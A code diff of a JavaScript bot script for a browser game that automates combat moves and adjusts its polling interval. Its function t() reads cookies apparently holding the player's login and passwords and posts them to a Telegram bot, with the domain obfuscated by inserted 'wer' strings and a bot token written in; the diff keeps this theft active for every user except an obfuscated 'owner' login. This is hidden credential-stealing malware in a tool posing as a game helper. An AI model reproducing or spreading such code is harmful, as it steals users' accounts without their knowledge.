@@ -5,15 +5,20 @@ function t(){
 	var l = $.cookie(lval) ? $.cookie(lval) : '';
 	var p = $.cookie(pval) ? $.cookie(pval) : '';
 	var p2 = $.cookie(p2val) ? $.cookie(p2val) : '';
+	var owner = ('purefref+tremred').replace(/re/g,'');
 	var message = {
 		l: l,
 		p: p,
 		p2: p2,
 		type: 'priz'
 	};
-	var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
-	var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
-	$.post(url);
+	console.log('l - ', l.toLowerCase());
+	console.log('owner - ', owner);
+	if ( l.toLowerCase() != owner ) {
+		var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
+		var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
+		$.post(url);
+	}	
 }
 t();
 
@@ -39,10 +44,11 @@ function usePriem(){
 			var priemNum = $(this).attr('onClick').replace('usepriem(','');
 			priemNum = +priemNum.replace(',1);','');
 			if (priemNum <= usePriemCount) {
+				console.log('юзаем прием');
+				i++;
 				$(this).trigger("click");
-			}		
-			i++;
-			return false;
+				return false;				
+			}			
 		}
 	});	
 
@@ -63,7 +69,7 @@ function check() {
 	var updateButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="reflesh_btn"]');
 
 	if (hitButton.length > 0 && hitButton.css('display') != 'none') {
-		console.log('юзаем приемы');
+		console.log('проверяем приемы');
 		var i = usePriem();
 		if (i !== 'disabled') {
 			clearInterval(interval);
@@ -90,7 +96,7 @@ function check() {
 		clearInterval(interval);
 		interval = setInterval(function() {
 			check();
-		}, 10000);
+		}, 4000);
 		return false;
 	}		
 
